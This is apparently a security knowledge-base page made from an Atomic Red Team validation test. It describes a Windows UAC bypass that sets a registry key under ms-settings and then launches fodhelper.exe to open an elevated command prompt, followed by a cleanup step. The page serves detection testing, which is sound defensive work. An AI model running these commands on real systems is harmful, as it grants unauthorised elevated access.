---
atomic_guid: "58f641ea-12e3-499a-b684-44dee46bd182"
title: "Bypass UAC using Fodhelper"
framework: "atomic"
generated: "true"
attack_technique_id: "T1548.002"
attack_technique_name: "Abuse Elevation Control Mechanism: Bypass User Account Control"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml"
build_date: "2026-04-26 17:02:13"
executor: "command_prompt"
aliases:
  - "58f641ea-12e3-499a-b684-44dee46bd182"
  - "Bypass UAC using Fodhelper"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Bypass UAC using Fodhelper

Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
Upon execution, "The operation completed successfully." will be shown twice and command prompt will be opened.

## Metadata

- Atomic GUID: 58f641ea-12e3-499a-b684-44dee46bd182
- Technique: T1548.002: Abuse Elevation Control Mechanism: Bypass User Account Control
- Platforms: windows
- Executor: command_prompt
- Source Path: atomics/T1548.002/T1548.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1548-abuse_elevation_control_mechanism|T1548.002]]

## Input Arguments

### executable_binary

- description: Binary to execute with UAC Bypass
- type: path
- default: C:\Windows\System32\cmd.exe

## Executor

- name: command_prompt

### Command

```cmd
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
fodhelper.exe
```

### Cleanup

```cmd
reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml)
